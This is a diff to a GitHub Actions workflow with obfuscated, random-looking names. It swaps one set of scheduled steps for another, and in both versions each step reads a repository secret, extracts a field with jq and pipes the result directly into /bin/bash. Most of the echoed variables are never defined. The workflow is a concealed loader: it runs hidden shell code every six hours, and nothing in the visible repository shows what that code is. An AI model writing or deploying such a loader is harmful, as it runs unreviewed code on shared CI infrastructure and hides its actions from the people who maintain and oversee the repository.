@@ -3,26 +3,19 @@ name: shenwansi4178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 2/6 * * *'
-
+    - cron: '25 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shenwansi4178
         env:
-          dht77558: ${{ secrets.dht77558 }}
+          slncf19: ${{ secrets.slncf19 }}
         run: |
-          echo $dht77558 | jq -r .xqogs890 | /bin/bash
-          echo $cx22 | jq -r .avd40 | /bin/bash
-          echo $kdtl2 | jq -r .pekw982 | /bin/bash
-          echo $qf58 | jq -r .gn8586 | /bin/bash
-          echo $zad20879 | jq -r .vd64 | /bin/bash
-          echo $jd31 | jq -r .lanns7561 | /bin/bash
-          echo $dv6 | jq -r .ssut64 | /bin/bash
-          echo $jc5611 | jq -r .ecqe82413 | /bin/bash
-          echo $zxlwl56 | jq -r .qzra04 | /bin/bash
-          echo $n02464 | jq -r .va1 | /bin/bash
+          echo $slncf19 | jq -r .z65 | /bin/bash
+          echo $thd6476 | jq -r .kgq4 | /bin/bash
+          echo $ynupr40 | jq -r .t3 | /bin/bash
+          echo $nzash6703 | jq -r .n9 | /bin/bash
+          echo $fa107 | jq -r .ieby12 | /bin/bash
 
